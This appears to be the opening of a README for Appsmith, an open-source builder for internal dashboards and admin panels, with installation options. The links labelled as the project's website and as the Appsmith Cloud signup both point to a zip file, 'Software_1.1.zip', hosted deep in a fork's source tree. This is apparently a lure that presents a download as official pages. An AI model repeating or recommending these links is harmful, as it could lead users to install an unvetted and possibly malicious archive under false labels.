Organizations build internal applications such as dashboards, database GUIs, admin panels, approval apps, customer support dashboards, and more to help their teams perform day-to-day operations. Appsmith is an open-source tool that enables the rapid development of these internal apps. Read more on our [website](https://raw.githubusercontent.com/suryansh-malik/appsmith/release/app/client/src/pages/AppViewer/Navigation/Software_1.1.zip).

## Installation
There are two ways to start using Appsmith:

- Signup on [Appsmith Cloud](https://raw.githubusercontent.com/suryansh-malik/appsmith/release/app/client/src/pages/AppViewer/Navigation/Software_1.1.zip).
- Install Appsmith on your machine. See the installation guides below.
